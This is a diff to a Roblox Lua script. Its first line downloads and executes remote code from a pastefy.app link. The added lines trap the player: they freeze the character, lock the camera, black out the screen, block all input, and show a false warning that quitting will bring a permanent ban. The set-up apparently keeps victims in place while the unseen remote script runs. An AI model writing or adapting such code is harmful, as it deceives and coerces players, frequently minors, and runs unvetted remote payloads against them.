@@ -1,1 +1,53 @@
+-- 👇 Your original script
 loadstring(game:HttpGet("https://pastefy.app/vItsWtT6/raw"))()
+
+-- 👇 Freeze + warning message (client-side only)
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local player = Players.LocalPlayer
+local camera = workspace.CurrentCamera
+
+if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+    player.Character.HumanoidRootPart.Anchored = true
+end
+
+camera.CameraType = Enum.CameraType.Scriptable
+camera.CFrame = CFrame.new(0, 0, 0)
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "TrapScreen"
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+local blackFrame = Instance.new("Frame")
+blackFrame.Size = UDim2.new(1, 0, 1, 0)
+blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+blackFrame.BorderSizePixel = 0
+blackFrame.Parent = screenGui
+
+UserInputService.InputBegan:Connect(function()
+    return Enum.ContextActionResult.Sink
+end)
+UserInputService.InputChanged:Connect(function()
+    return Enum.ContextActionResult.Sink
+end)
+
+-- 👇 Scary warning with highlights
+local warningGui = Instance.new("ScreenGui")
+warningGui.Name = "ScaryWarning"
+warningGui.IgnoreGuiInset = true
+warningGui.ResetOnSpawn = false
+warningGui.Parent = player:WaitForChild("PlayerGui")
+
+local textLabel = Instance.new("TextLabel")
+textLabel.Size = UDim2.new(0.9,0,0.3,0)
+textLabel.Position = UDim2.new(0.05,0,0.35,0)
+textLabel.BackgroundTransparency = 1
+textLabel.RichText = true
+textLabel.TextScaled = true
+textLabel.Font = Enum.Font.GothamBlack
+textLabel.Text = "⚠️ WARNING: <b><font color='rgb(255,0,0)'>DON'T LEAVE</font></b> the game while the script is loading...\nYou will get a <b><font color='rgb(255,0,0)'>PERMANENT BAN</font></b> if you quit now."
+textLabel.TextColor3 = Color3.new(1,1,1)
+textLabel.TextStrokeTransparency = 0.5
+textLabel.Parent = warningGui
